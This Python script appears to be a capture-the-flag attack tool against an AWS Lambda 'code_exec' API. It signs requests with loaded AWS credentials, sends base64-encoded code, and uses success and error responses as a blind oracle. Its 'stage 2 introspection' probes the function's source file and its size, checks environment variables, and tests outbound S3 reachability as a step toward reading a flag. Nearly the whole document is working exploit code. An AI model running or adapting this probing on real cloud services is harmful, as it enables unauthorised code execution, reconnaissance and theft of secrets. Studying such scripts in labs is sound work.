import json
import base64
import os
import urllib.request
import urllib.error
import time
import sys
from pathlib import Path

try:
    import boto3
    from botocore.auth import SigV4Auth
    from botocore.awsrequest import AWSRequest
    from botocore.credentials import Credentials
except ImportError:
    print("ERROR: botocore and boto3 required.", file=sys.stderr)
    sys.exit(1)

def load_creds():
    creds_file = Path(__file__).parent / "creds.txt"
    if creds_file.exists():
        lines = [line.strip() for line in creds_file.read_text(encoding="utf-8").splitlines() if line.strip()]
        creds_map = {}
        for line in lines:
            if ":" in line:
                k, v = line.split(":", 1)
                creds_map[k.strip().lower()] = v.strip()
        ak = creds_map.get("access key id", os.environ.get("AWS_ACCESS_KEY_ID", ""))
        sk = creds_map.get("secret key", os.environ.get("AWS_SECRET_ACCESS_KEY", ""))
        tk = creds_map.get("session token", os.environ.get("AWS_SESSION_TOKEN", ""))
        return ak, sk, tk
    return (
        os.environ.get("AWS_ACCESS_KEY_ID", ""),
        os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        os.environ.get("AWS_SESSION_TOKEN", "")
    )

AK, SK, TK = load_creds()
creds = Credentials(AK, SK, TK)
API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
USER = "userd8a2f72fe43094e8"
FLAG_KEY = "flag.txt"
PATH_URL = f"https://s3.us-east-1.amazonaws.com/{USER}/{FLAG_KEY}"
OK = '{"result":"Code executed successfully"}'
FAIL = '{"error":"Something went wrong!"}'

def exec_code(code, timeout=30):
    b64 = base64.b64encode(code.encode("utf-8")).decode("ascii")
    payload = json.dumps({"code": b64})
    r0 = AWSRequest(method="POST", url=API, data=payload, headers={"Content-Type": "application/json"})
    SigV4Auth(creds, "execute-api", "us-east-1").add_auth(r0)
    req = urllib.request.Request(API, data=payload.encode("utf-8"), headers=dict(r0.headers), method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8").strip()
    except Exception as e:
        return e.read().decode("utf-8").strip() if hasattr(e, "read") else str(e)

def maj(code, tries=5):
    votes = []
    for _ in range(tries):
        b = exec_code(code)
        if b == OK:
            votes.append(True)
        elif b == FAIL:
            votes.append(False)
        else:
            time.sleep(0.25)
            continue
        if len(votes) >= 3 and len(set(votes[-3:])) == 1:
            return votes[-1]
    return max(set(votes), key=votes.count) if votes else None

print("=== STARTING STAGE 2 RUNTIME INTROSPECTION ===", flush=True)

# Test 1: Can we read /var/task files?
res_task = maj("""
import os
assert os.path.exists('/var/task/lambda_function.py')
""")
print(f"Exists /var/task/lambda_function.py: {res_task}", flush=True)

# Test 2: Check length of lambda_function.py
for size_bin in [100, 500, 1000, 2000, 5000]:
    res_size = maj(f"""
import os
assert os.path.getsize('/var/task/lambda_function.py') < {size_bin}
""")
    if res_size is True:
        print(f"lambda_function.py size is less than {size_bin} bytes", flush=True)
        break

# Test 3: Check environment variables for hints
res_env = maj("""
import os
keys = list(os.environ.keys())
# Check if any custom non-AWS env var exists
custom = [k for k in keys if not k.startswith('AWS_') and not k.startswith('LAMBDA_') and not k.startswith('_')]
assert len(custom) > 0
""")
print(f"Has custom non-AWS environment variables: {res_env}", flush=True)

# Test 4: Can we make outbound HTTP requests to other AWS endpoints or is it strictly S3 VPCe?
res_s3_root = maj("""
import urllib.request
req = urllib.request.Request('https://s3.us-east-1.amazonaws.com/')
try:
    urllib.request.urlopen(req, timeout=3)
    assert True
except Exception as e:
    assert hasattr(e, 'code') and e.code in [307, 403, 404, 405]
""")
print(f"Can connect to HTTPS S3 root via VPCe: {res_s3_root}", flush=True)

print("=== INTROSPECTION COMPLETE ===", flush=True)
